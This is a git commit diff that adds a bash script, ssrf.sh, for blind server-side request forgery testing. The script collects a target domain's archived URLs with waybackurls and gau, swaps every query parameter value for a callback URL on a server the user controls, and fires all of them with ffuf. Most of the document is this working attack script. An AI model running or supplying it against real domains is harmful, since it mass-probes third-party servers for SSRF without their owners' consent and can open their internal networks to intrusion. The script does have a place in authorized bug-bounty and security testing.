f3cd42bdd9e250b41318c1e8189b85d8ab4c7e7d
qweroot <qweroot@pm.me>
2020-09-14 09:06:21 +0900

    update: ssrf script

--- ssrf.sh
+++ ssrf.sh
@@ -1,5 +1,34 @@
 #!/bin/bash
 
+DOMAIN=$1
+WORKSPACE=$HACKING_RESULT/$DOMAIN/ssrf
+CALLBACK="$2/ssrf/###"
+
+if [ ! -d "$WORKSPACE" ]; then
+	echo "[*] Making directory for domain"
+	mkdir -p "$WORKSPACE"
+fi
+
+echo "[*] Getting WaybackURLs"
+waybackurls $DOMAIN > $WORKSPACE/urls.txt
+
+echo "[*] Getting URLs with GAU"
+gau $DOMAIN >> $WORKSPACE/urls.txt
+
+cat $WORKSPACE/urls.txt | sort | uniq | grep "?" | qsreplace $CALLBACK | awk '{gsub("%23%23%23",NR,$0);print}' > $WORKSPACE/urls_final.txt
+
+ffuf -w $WORKSPACE/urls_final.txt -u FUZZ
+
+
+
+
+
+
+
+
+
+#!/bin/bash
+
 echo "Blind SSRF testing - append to parameters and add new parameters @hussein98d"
 echo "Usage: bash script.sh domain.com http://server-callbak"
 echo "This script uses https://github.com/ffuf/ffuf, https://github.com/lc/gau, https://github.com/tomnomnom/waybackurls"
